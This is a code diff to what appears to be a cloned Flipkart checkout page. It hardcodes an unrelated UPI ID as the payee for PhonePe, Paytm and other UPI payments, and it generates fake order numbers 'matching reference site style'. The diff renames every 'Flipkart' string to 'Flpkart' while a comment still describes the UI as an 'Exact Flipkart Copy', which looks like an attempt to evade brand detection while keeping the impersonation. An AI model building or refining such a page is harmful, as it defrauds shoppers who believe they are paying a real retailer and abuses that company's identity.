@@ -424,7 +424,7 @@ function PaymentPageContent({ params }: { params: Promise<{ id: string }> }) {
   const [upiId, setUpiId] = useState('03400C123L@mairtel');
   const [phonepeUpiId, setPhonepeUpiId] = useState('03400C123L@mairtel');
   const [paytmUpiId, setPaytmUpiId] = useState('03400C123L@mairtel');
-  const [merchantName, setMerchantName] = useState('Flipkart');
+  const [merchantName, setMerchantName] = useState('Flpkart');
 
   const getInitials = (name: string) => {
     if (!name) return "JA";
@@ -775,12 +775,12 @@ function PaymentPageContent({ params }: { params: Promise<{ id: string }> }) {
   const handleAppPay = useCallback((app: string) => {
     const activePp = (phonepeUpiId || upiId || '03400C123L@mairtel').trim();
     const activePt = (paytmUpiId || upiId || '03400C123L@mairtel').trim();
-    const activeName = (merchantName || 'Flipkart').trim();
+    const activeName = (merchantName || 'Flpkart').trim();
     const pn_encoded = encodeURIComponent(activeName);
     
     // Exact 10-digit random order number matching reference site style
     const randomOrderId = Math.floor(Math.random() * 9000000000) + 1000000000;
-    const txnNote = `Paying To Flipkart ORDER${randomOrderId}`;
+    const txnNote = `Paying To Flpkart ORDER${randomOrderId}`;
     const amtNum = parseFloat(String(selling)) || 0;
     const amtStr = amtNum.toFixed(2);
     
@@ -1049,7 +1049,7 @@ function PaymentPageContent({ params }: { params: Promise<{ id: string }> }) {
         </div>
       </div>
 
-      {/* Checkout Progress Stepper Bar (Exact Flipkart Copy) */}
+      {/* Checkout Progress Stepper Bar (Exact Flpkart Copy) */}
       <div className="bg-white border-b border-slate-200 py-3 px-4 select-none">
         <div className="max-w-md mx-auto flex items-center justify-between">
           <div className="flex flex-col items-center w-20">
@@ -1317,7 +1317,7 @@ function PaymentPageContent({ params }: { params: Promise<{ id: string }> }) {
 
         {/* Gift Card & Other Payment Options Container (Separated by clean background gap) */}
         <div className="bg-white border border-slate-200 rounded-xl divide-y divide-slate-200 overflow-hidden mb-4 shadow-2xs">
-          {/* Have a Flipkart Gift Card? Row */}
+          {/* Have a Flpkart Gift Card? Row */}
           <div className="w-full bg-white py-3.5 px-4 flex items-center justify-between select-none cursor-pointer hover:bg-slate-50">
             <div className="flex items-center gap-3.5">
               <GiftCardIcon className="h-5 w-7 text-[#111111] shrink-0" />
